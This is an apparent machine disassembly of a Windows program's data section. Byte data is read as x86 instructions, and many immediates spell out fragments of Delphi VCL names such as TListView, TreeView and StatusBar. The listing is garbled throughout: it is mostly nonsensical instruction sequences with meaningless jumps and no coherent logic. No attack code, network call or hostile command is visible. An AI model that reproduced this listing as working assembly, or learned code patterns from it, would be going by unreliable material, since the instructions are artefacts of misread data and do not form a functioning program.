adc [ eax ] al
sbb al 0x0
add [ eax ] al
or [ edi + edx * 2 + 0x6f ] edx
jb r-xdata
insb
jae r-xdata
lea eax [ eax ]
add ah bl
inc ebx
popad
outsb
add [ gs : bx + si ] dl
inc eax
add [ edx ] cl
add [ eax ] al
jmp [ ebp + eax * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
or [ edi + 0x72 ] dl
imul ebp [ edi + 0x6e ] 0x43dafc73
add al bh
inc cx
add [ ebx ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
push eax
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
fiadd [ ebx ]
sbb al 0x0
add [ eax ] al
mov ah 0x69
inc ecx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x67 ] ah
push eax
fiadd [ ebx ]
add ah al
xchg esp eax
popad
insb
fld [ ebx ]
mov ah 0x68
inc ecx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x69 ] ch
inc ecx
add [ ebp - 0x2693ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 - 0x2653ffbd ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x240043d9 ] bl
add [ eax ] al
add [ eax ] ch
push 0x34340041
inc eax
push ebx
je r-xdata
je r-xdata
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x74 ]
insd
js r-xdata
je r-xdata
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
fild [ ebx ]
or al 0x0
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
inc eax
inc ecx
jb r-xdata
add al ah
0x540a0041 0x6f57
jb r-xdata
inc ecx
insb
jae r-xdata
add [ eax + 0x60043dc ] bh
je r-xdata
add esp edi
add [ eax ] eax
add [ eax ] al
add [ 0xfffffffffc000000 ] al
jae r-xdata
mov eax eax
mov ah 0xdb
inc ebx
add [ ebx ] al
or dl [ esi + edx * 2 + 0x69 ]
ja r-xdata
jb r-xdata
shl [ ebx + ebx * 8 + 0xa030043 ] 0x54
push esi
imul esp [ ebp + 0x77 ] 0x6c797453
inc ebx
add [ eax ] cl
add [ eax ] al
add [ edx + ebx * 8 + 0x43 ] dh
add [ ebx + ebx * 8 ] bl
popad
jae r-xdata
add [ eax ] bl
fiadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
imul ebp [ esi + 0x67 ] 0x4566690d
js r-xdata
imul esp [ esi + 0x44 ] 0xf617461
imul esp [ esi + 0x50 ] 0x69747261
popad
insb
push ebx
je r-xdata
jae r-xdata
or [ ebx + 0x6f ] al
inc ebx
add [ ebx ] al
or edx [ ecx + ecx * 2 + 0x74 ]
insd
jb r-xdata
dec ecx
je r-xdata
jne r-xdata
fild [ ebx ]
push es
imul esi [ ebx + 0x4e ] 0x5656e6f
imul esi [ ebx + 0x43 ] 0x690d7475
jae r-xdata
add [ eax ] al
add eax 0xfc000000
je r-xdata
popad
jo r-xdata
jae r-xdata
insb
dec ecx
arpl [ edi + 0x6e ] bp
or esi [ esi + 0x73 ]
push ebx
insd
popad
insb
insb
dec ecx
arpl [ edi + 0x6e ] bp
push es
jbe r-xdata
fiadd [ ebx ]
add edx [ eax ]
push esp
dec ecx
arpl [ edi + 0x6e ] bp
fiadd [ ebx ]
inc esp
push 0x41
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
outsd
je r-xdata
jae r-xdata
insb
insb
arpl [ ebx + edx * 2 + 0x74 ] si
jb r-xdata
fild [ ebx ]
cld
insb
jae r-xdata
adc [ ebx + edx * 2 + 0x65 ] dl
popad
pop es
arpl [ ecx + ecx * 2 + 0x6d ] si
popad
pop es
arpl [ ebx + edx * 2 + 0x74 ] si
popad
je r-xdata
js r-xdata
jo r-xdata
insd
js r-xdata
or eax 0x72447369
outsd
arpl [ gs : ebp + 0x64 ] si
or al 0x69
jae r-xdata
inc esi
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x60043db ] dh
jbe r-xdata
insb
add al [ eax ]
add [ eax ] al
js r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x52737608
jo r-xdata
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ esp + edx * 2 ] cl
dec ecx
arpl [ edi + 0x6e ] bp
dec edi
jo r-xdata
mov al [ 0xffffffffac004031 ]
xchg ebx eax
inc ecx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
popad
outsb
insd
outsb
je r-xdata
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
add ah al
xchg esp eax
insb
jae r-xdata
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x45 ]
jb r-xdata
or eax 0x78456669
inc eax
add [ ebp + ebx * 8 + 0x43 ] ah
add [ ebx ] al
adc dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
insb
fld [ fs : ebx ]
add edx [ edx ]
outsb
or [ bx + di + 0x66 ] ebp
dec esi
popad
jb r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
fadd [ fs : ebx ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
pushad
fld [ ebx ]
or ebp [ eax + 0x74 ]
dec eax
popad
outsb
push 0x65726944
jb r-xdata
push esp
push ebx
popad
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
mov eax eax
jl r-xdata
imul ebp [ ecx + ebp * 2 + 0x74 ] 0x69096465
jae r-xdata
inc ebx
add [ esi ] al
arpl [ esp + edx * 2 + 0x65 ] si
or [ ecx + ecx * 2 + 0x74 ] edx
insd
insd
inc ebx
je r-xdata
outsb
or [ bp + di + 0x6f ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebx * 8 + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
je r-xdata
inc ecx
jb r-xdata
add [ ebp - 0x2587ffc0 ] cl
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
outsb
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x44 ]
insb
je r-xdata
dec eax
outsd
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insb
jae r-xdata
arpl [ ebx + 0x53 ] bp
je r-xdata
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x54746f48
jae r-xdata
insd
insb
jae r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x646c6f43
push cs
jb r-xdata
dec esp
je r-xdata
add [ eax + eax ] al
insb
jae r-xdata
push esp
dec ecx
je r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ch [ fs : ecx + 0x73 ]
push ebx
push es
or edx [ ecx + ecx * 2 + 0x74 ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
imul esp [ ecx + 0x4c ] 0x8746665
inc ebx
outsd
add [ eax ] al
lea eax [ eax ]
js r-xdata
add [ 0x6f546169 ] al
jo r-xdata
inc ebx
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
je r-xdata
inc ebp
jbe r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x54746f48
jb r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
imul esi [ fs : edi + eax + 0x42 ] 0x656c6f6f
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
fld [ ebx ]
mov eax eax
loopne r-xdata
pushad
outsb
je r-xdata
push eax
outsd
imul ebp [ esi + 0x74 ] 0x5574680f
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
inc eax
add [ eax ] al
fadd [ ebx ]
add ecx [ edx ]
push esp
dec ecx
je r-xdata
inc ebx
add [ eax ] al
adc [ eax ] al
nop
js r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
imul esi [ fs : ecx + ebp * 2 + 0x6e ] 0x65764567
outsb
inc eax
imul ebp [ esi + 0x65 ] 0x8746f48
pop es
jae r-xdata
jae r-xdata
insb
sar [ esp + ebx * 8 + 0x9030043 ] 0x54
dec ecx
je r-xdata
jb r-xdata
inc ebx
push 0x65676e61
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x24 ] bh
insd
or al 0x54
dec ecx
arpl [ edi + 0x6e ] bp
dec edi
jo r-xdata
insb
jae r-xdata
pop es
or dl [ edi + edx * 2 + 0x6f ]
jb r-xdata
inc ebx
add [ ebx ] al
adc [ ecx + ecx * 2 + 0x63 ] dl
outsd
outsb
push es
push ebx
je r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc eax
add [ ecx ] ecx
inc ecx
insb
insd
insb
outsd
ja r-xdata
or [ ecx + 0x6c ] eax
add [ eax + r-xdata ] dl
or [ eax ] dl
push esp
dec ecx
je r-xdata
inc ebx
add al al
fld [ ebx ]
push es
inc ebx
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edx ] al
add [ eax ] al
add [ eax - 0x23 ] ah
inc ebx
add [ ebx ] cl
push 0x6e614874
insb
jae r-xdata
push ebx
je r-xdata
insd
inc ebp
jbe r-xdata
dec ecx
je r-xdata
imul ebp [ esi + 0x67 ] 0x6e657645
insb
jae r-xdata
outsb
jb r-xdata
inc ecx
bound ebp [ edi + 0x76 ]
pop es
push 0x646e5574
jb r-xdata
inc ebx
outsd
insb
push cs
push edx
imul esp [ edi + 0x68 ] 0x64730774
add [ eax ] al
or al 0xdd
inc ebx
add [ esi ] al
jae r-xdata
add al 0x0
inc esi
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
insd
popad
outsb
or eax 0x78456669
dec esp
push esi
inc ebx
push 0x69676e61
outsb
inc ebp
jbe r-xdata
add [ eax - 0x28 ] dh
inc ebx
add ah ah
adc [ eax ] al
lea eax [ eax ]
enter 0x43de 0x0
imul ebp [ esi + 0x67 ] 0x40117400
or [ esi ] cl
push esp
dec esp
push esi
inc ebx
push 0x65676e61
inc ebp
jbe r-xdata
add al cl
fiadd [ ebx ]
dec ecx
jb r-xdata
outsb
je r-xdata
adc edx [ esp + ecx * 2 + 0x56 ]
outsb
je r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
inc ebx
add [ eax - 0x24 ] bh
inc ebx
insd
add [ ecx ] eax
push ebx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
dec eax
or [ ecx + ecx * 2 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] eax
add [ eax ] al
fld [ ebx ]
add edx [ eax ]
add al 0x49
je r-xdata
outsb
add [ eax ] cl
push cs
push esp
dec esp
push esi
inc ebp
imul esi [ fs : ebp + 0x64 ] 0x6e657645
add [ eax - 0x28 ] dh
inc ebx
add [ eax ] ah
fiadd [ ebx ]
or [ edi ] cl
push esp
dec esp
push esi
inc ebp
insd
add [ ecx + edx + 0x40 ] dh
jae r-xdata
inc eax
dec eax
outsd
je r-xdata
inc edx
insb
outsd
ja r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
outsb
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
add [ esi ] al
inc ebx
push 0x65676e61
or edx [ ecx + ecx * 2 + 0x74 ]
insd
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
adc edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
lea eax [ eax ]
rcr ch 0x43
add [ esi ] al
inc ebx
outsd
insd
inc ebx
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jae r-xdata
outsb
jb r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
je r-xdata
inc ebx
outsd
insb
jne r-xdata
add cl [ eax ]
push es
push ebx
dec ecx
je r-xdata
insd
pop es
inc ebx
outsd
insb
jne r-xdata
push 0x65676e61
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax - 0x28 ] dh
inc ebx
add [ eax - 0x24 ] bh
inc ebx
add [ eax ] al
adc [ eax ] al
mov eax eax
xchg esp eax
fild [ ebx ]
or [ ebx ] dl
push esp
dec esp
push esi
inc ecx
insb
dec ecx
je r-xdata
je r-xdata
inc ecx
inc ebx
outsd
insb
jne r-xdata
or [ esi ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
push esp
dec esp
dec ecx
je r-xdata
inc eax
jb r-xdata
dec ecx
outsb
outsb
adc [ 0x6e696f50 ] al
je r-xdata
insb
outsd
ja r-xdata
insd
add [ eax ] al
add [ eax ] al
nop
cmp al ah
inc ebx
add [ eax ] cl
andps xmm1 [ esi + edx * 2 + 0x43 ]
outsb
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
dec ecx
je r-xdata
inc ebx
push 0x65676e61
insd
add [ esi ] al
inc ebx
push 0x65676e61
or edx [ ecx + ecx * 2 + 0x74 ]
insd
pop es
outsb
push edx
inc ebx
insb
imul esp [ ebx + 0x6b ] 0x6e657645
je r-xdata
arpl [ gs : eax + ecx + 0x6 ] si
insd
jb r-xdata
outsb
inc ebx
outsd
insd
jo r-xdata
pop es
outsd
insd
jo r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax ] dl
salc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
or [ edi ] cl
push esp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x40117400
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
jb r-xdata
inc ebx
inc ebx
outsd
insb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
inc ebx
push 0x65676e61
add [ ebx ] ecx
insd
outsb
insd
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
inc ebx
jne r-xdata
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
nop
clc
loopne r-xdata
jb r-xdata
dec ecx
jns r-xdata
push cs
push esp
dec esp
push esi
dec esi
outsd
je r-xdata
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
mov eax 0x80043e0
inc ebp
jbe r-xdata
dec esp
push esi
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] dl
salc
inc ebx
add ah bl
fild [ ebx ]
or [ esp + edx * 2 ] dl
dec esp
push esi
inc ebx
outsd
insb
jne r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
jae r-xdata
pop es
or [ esi ] al
inc ebx
outsd
insb
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jae r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc ebx
jne r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
push ebx
add [ eax ] cl
adc dl [ esp + ecx * 2 + 0x56 ]
pop es
dec ecx
outsb
je r-xdata
push edx
insd
add [ eax ] cl
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
pop es
inc edx
je r-xdata
outsb
jbe r-xdata
add [ eax + edx + 0x40 ] dl
outsb
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x4 ] si
dec ecx
jb r-xdata
dec ecx
je r-xdata
je r-xdata
dec ecx
outsd
arpl [ gs : ecx + eax + 0xb ] si
dec ecx
je r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
andps xmm0 [ ebx + 0x75 ]
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
add eax 0x63655254
je r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x56 ] dl
inc esp
insb
arpl [ gs : ecx + ecx * 2 + 0x74 ] si
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
je r-xdata
outsb
add eax 0x65530608
outsb
jb r-xdata
add [ eax - 0x28 ] dh
inc ebx
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
push esp
loope r-xdata
insd
or [ esp + ecx * 2 + 0x69 ] edx
add [ eax ] al
add [ eax ] bl
bound eax [ eax ]
enter 0x43e1 0x0
or [ edx ] dl
push esp
dec esp
push esi
ja r-xdata
inc eax
add [ ecx + 0x43 ] dl
add [ eax - 0x28 ] dh
inc ebx
add [ eax + r-xdata ] dl
or [ edx ] dl
push esp
dec esp
push esi
insd
inc ebp
je r-xdata
outsb
insd
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
inc esp
popa
add [ ebx ] ecx
push esp
push edx
inc ebx
jne r-xdata
je r-xdata
ja r-xdata
adc [ edx + edx * 2 ] al
insd
ja r-xdata
insd
dec esp
push ebx
je r-xdata
add eax 0x74617453
andps xmm1 [ gs : edi + 0x77 ]
je r-xdata
jne r-xdata
or eax [ ebp + 0x66 ]
popad
outsb
jb r-xdata
andps xmm1 [ edi + 0x77 ]
xor [ ecx ] ecx
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ 0x6d657449 ] al
xor cl [ ecx ]
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
or [ 0x6d657449 ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x5 ] si
dec ecx
je r-xdata
je r-xdata
je r-xdata
je r-xdata
add [ ecx + edx + 0x40 ] dh
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
add [ esp + eax * 2 ] al
popad
je r-xdata
insd
add eax 0x65530608
outsb
imul esi [ ebx + 0x74 ] 0x77656956
dec ecx
je r-xdata
dec esp
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
jne r-xdata
jb r-xdata
je r-xdata
add eax 0x63655241
imul esi [ ebx + 0x74 ] 0x6d657449
add al 0x49
imul esi [ ebx + 0x74 ] 0x77656956
jb r-xdata
add [ ebp - 0x1f47ffc0 ] cl
inc ebx
add [ eax ] cl
inc eax
add [ eax - 0x28 ] dh
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
insd
inc esp
jb r-xdata
loope r-xdata
insd
inc ebp
jbe r-xdata
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
inc ebx
jne r-xdata
dec esp
push esi
insd
jb r-xdata
add [ 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
insd
je r-xdata
dec ecx
je r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
insd
inc esp
jb r-xdata
inc ebp
jbe r-xdata
je r-xdata
push ebx
je r-xdata
ja r-xdata
jae r-xdata
outsd
popad
ja r-xdata
push esp
inc ebx
inc esp
jb r-xdata
ja r-xdata
insb
inc ebx
jne r-xdata
add [ eax ] cl
adc dl [ esp + ecx * 2 + 0x56 ]
outsb
je r-xdata
inc ecx
jbe r-xdata
sbb dl [ esp + ecx * 2 + 0x56 ]
je r-xdata
outsd
outsd
insb
popad
outsb
outsb
arpl [ ebp + 0x64 ] sp
outsb
dec ecx
je r-xdata
lea eax [ eax ]
aam 0xe3
insd
inc esp
jb r-xdata
ja r-xdata
insd
pop es
dec ecx
outsb
je r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x74490408
insd
ja r-xdata
outsd
insb
popad
outsb
je r-xdata
outsb
insd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
jb r-xdata
je r-xdata
add [ eax - 0x16 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sub al 0xe2
inc edx
je r-xdata
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
ja r-xdata
inc ebx
add [ eax ] cl
push ss
push esp
dec esp
push esi
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x1dd3ffc0 ] cl
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
add [ eax ] cl
insd
dec esp
add ah dl
jecxz r-xdata
add al 0x8
inc ebx
jne r-xdata
add [ edi ] al
push ebx
jne r-xdata
insd
push esp
inc ebx
jne r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
add [ eax ] al
in al 0xca
inc ebx
add [ eax ] al
adc [ eax ] al
inc esp
popa
jne r-xdata
jbe r-xdata
push es
add [ eax + ecx ] al
jb r-xdata
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
je r-xdata
jae r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
add [ eax ] al
adc [ eax ] al
mov al 0xe2
inc ebx
add [ eax ] cl
sbb [ esp + ecx * 2 + 0x56 ] edx
inc ebx
jne r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
je r-xdata
add [ gs : ebx ] ecx
je r-xdata
inc ebp
jbe r-xdata
outsb
je r-xdata
dec esp
add [ eax ] cl
adc al [ 0x63655241 ]
push esp
inc ebx
jne r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x74490408
insd
je r-xdata
inc esp
je r-xdata
je r-xdata
je r-xdata
inc ebx
inc eax
add [ ebp - 0x1c2bffc0 ] cl
je r-xdata
outsb
add eax 0x74617453
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
outsd
je r-xdata
pop es
je r-xdata

insd
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add [ eax ] al
je r-xdata
add ah al
insd
outsb
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ esi ] al
outsd
insd
inc esp
jb r-xdata
add [ 0x67617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
push esp
ja r-xdata
je r-xdata
in eax 0x43
dec ecx
je r-xdata
jae r-xdata
insd
inc esp
jb r-xdata
dec ecx
ja r-xdata
insb
insd
inc esp
jbe r-xdata
add [ 0x74617453 ] al
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
insd
add eax 0x65530608
outsb
jb r-xdata
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
arpl [ ebp + eax + 0x54 ] si
outsd
insd
inc esp
jb r-xdata
inc esp
popa
jne r-xdata
add [ ebx ] ecx
popad
insd
inc esp
jb r-xdata
jb r-xdata
adc al [ 0x63655241 ]
push esp
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
popad
ja r-xdata
dec ecx
outsd
adc [ gs : si + 0x43 ] dl
jne r-xdata
add [ gs : 0x67617453 ] al
je r-xdata
jb r-xdata
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
je r-xdata
jb r-xdata

insd
adc [ eax ] al
andps xmm0 [ ebx + 0x75 ]
ja r-xdata
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
add ah al
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
insd
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add ah al

inc edx
outsd
outsb
jb r-xdata
popad
je r-xdata
outsb
arpl [ ebp + 0x64 ] sp
inc ebx
jne r-xdata
je r-xdata
or [ ecx + ecx * 2 ] al
push esp
inc ebx
jne r-xdata
or [ esp + ecx * 2 + 0x69 ] edx
jae r-xdata
ja r-xdata
ja r-xdata
add [ eax - 0x16 ] ah
inc ebx
add [ eax - 0x28 ] dh
inc ebx
add [ eax + edx + 0x40 ] dl
add ah al

inc edx
outsd
or eax [ ebp + 0x66 ]
popad
ja r-xdata
insd
ja r-xdata
0xd8700043 0x43
je r-xdata
outsd
jne r-xdata
je r-xdata
jl r-xdata
insd
jae r-xdata
ja r-xdata
je r-xdata
ja r-xdata
outsd
jne r-xdata
popad
insd
inc ebp
jbe r-xdata
push 0x65726944
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ edi + edx * 2 ] al
jb r-xdata
insd
popad
je r-xdata
popad
je r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x56 ] edx
in al 0xca
inc ebx
add [ eax ] al
adc [ eax ] al
cmp al 0xe5
inc ebx
dec ecx
je r-xdata
outsd
je r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsb
jb r-xdata
push es
add [ edi ] al
push ebx
jne r-xdata
imul esi [ ebx + 0x74 ] 0x6d657449
je r-xdata
jb r-xdata
insd
inc esp
jb r-xdata
outsd
je r-xdata
inc eax
add [ esp + 0x43 ] bh
je r-xdata
insd
inc esp
jb r-xdata
dec ecx
add [ eax - 0x16 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add ah ah
0x43
inc edx
outsb
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
jne r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ eax - 0x16 ] ah
inc ebx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
outsb
je r-xdata
ja r-xdata
adc [ gs : ebx + eax * 2 + 0x75 ] dl
dec ecx
je r-xdata
bound ecx [ ecx + 0x74 ]
insd
je r-xdata
outsd
insb
popad
outsb
add [ eax ] cl
and [ esp + ecx * 2 + 0x56 ] edx
inc ecx
inc ebx
outsd
jb r-xdata
or [ esi ] al
push ebx
outsb
je r-xdata
ja r-xdata
insd
inc esp
jb r-xdata
add al 0x49
outsb
je r-xdata
outsb
jo r-xdata
outsb
js r-xdata
imul ebp [ esi + 0x67 ] 0x72745306
imul ebp [ esi + 0x67 ] 0x69460c12
outsb
push eax
outsd
jae r-xdata
outsb
je r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x6e657645
je r-xdata
inc esi
imul ebp [ esi + 0x64 ] 0x69460a02
outsb
push ebx
je r-xdata
inc esi
inc ebp
jbe r-xdata
dec edi
ja r-xdata
inc eax
add [ 0x11080043 ] bh
insd
pop es
dec ecx
outsb
je r-xdata
jae r-xdata
add [ gs : bp + di ] ecx
inc esp
popa
or [ ecx + ecx * 2 ] al
je r-xdata
push esp
insd
ja r-xdata
jae r-xdata
add [ eax ] dl
insd
add eax 0x67617453
ja r-xdata
je r-xdata
je r-xdata
push ebx
jb r-xdata
jne r-xdata
dec ecx
je r-xdata
add cl [ eax ]
push es
je r-xdata
adc [ eax ] eax
jo r-xdata
je r-xdata
inc ebp
insd
jb r-xdata
jbe r-xdata
adc [ gs : ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add [ 0x67617453 ] al
dec esp
imul esi [ ebx + 0x74 ] 0x77656956
add [ gs : bp + di ] ecx
imul esi [ ebx + 0x74 ] 0x6d657449
add al 0x49
add [ edx ] cl
push ebx
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0xa ] si
add [ 0x65646e49 ] eax
js r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
dec ecx
outsb
je r-xdata
jb r-xdata
je r-xdata
add [ eax ] cl
adc eax 0x4f564c54
inc eax
jb r-xdata
or [ eax ] ecx
push es
push ebx
outsb
jb r-xdata
push esp
dec esp
push esi
or [ ecx ] dl
jb r-xdata
adc cl [ si ]
inc esi
